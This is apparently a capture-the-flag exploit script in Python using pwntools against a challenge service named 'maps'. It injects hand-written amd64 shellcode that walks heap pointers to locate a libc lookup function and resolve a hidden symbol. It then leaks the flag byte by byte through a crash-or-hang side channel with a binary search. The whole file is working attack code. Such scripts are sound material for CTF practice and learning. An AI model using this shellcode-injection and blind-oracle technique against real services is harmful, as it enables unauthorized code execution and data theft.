#!/usr/bin/python

from pwn import *
import time

def testchar(offset,val):
	r = remote("localhost",11116) if len(sys.argv) < 2 else remote("maps.problem.cscctf.com",10003)
	# r = gdb.debug([exe.path],gdbscript="b *0x400e2e\nc\n")
	r.sendafter("> ",asm("""
		mov r15, 0x7f0000000000
		mov ebx, 0x602008
		mov rbx, [rbx]

		loop1:
			mov rbx, [rbx+0x18]
			cmp rbx, r15
			jge loop1

		sub rsp, 8
		mov rax, 0x101010101010101
		push rax
		mov rax, 0x101010101010101 ^ 0x3733333333
		xor [rsp], rax
		mov rax, 0x3333315f67616c66
		push rax
		mov rax, 0x5f74636572726f63
		push rax
		mov rsi, rsp

		mov ecx, 0x602028
		mov rcx, [rcx]
		add rcx, 0xe5b60

		mov rdi, rbx
		call rcx
		call rax

		mov dl, BYTE PTR [rax+{:d}]
		cmp dl, {:d}
		jge good

		bad:
			mov rax, 0x3c
			xor edi, edi
			syscall

		good:
			jmp $+0
	""".format(offset,val)))
	try:
		r.recv(1,timeout=0.5)
		r.close()
		return True
	except:
		r.close()
		return False


def bruteforce():
	flag = ''
	while True:
		low = 32
		high = 128
		mid = -1
		for i in xrange(8):
			mid = (low+high)/2
			# print("Testing {}".format(repr(chr(mid))))
			ret = testchar(len(flag),mid)
			if ret: low = mid
			else: high = mid

		if mid == 32: break

		flag += chr(mid)
		# print("Found {}".format(chr(mid)))
		sys.stdout.write(chr(mid))
		sys.stdout.flush()

	print("\nFlag: {}".format(flag))

context.log_level = "error"
context.arch = "amd64"
exe = ELF("./maps_debug")

start = time.time()
bruteforce()
print("Elapsed time: {:.3f}".format(time.time()-start))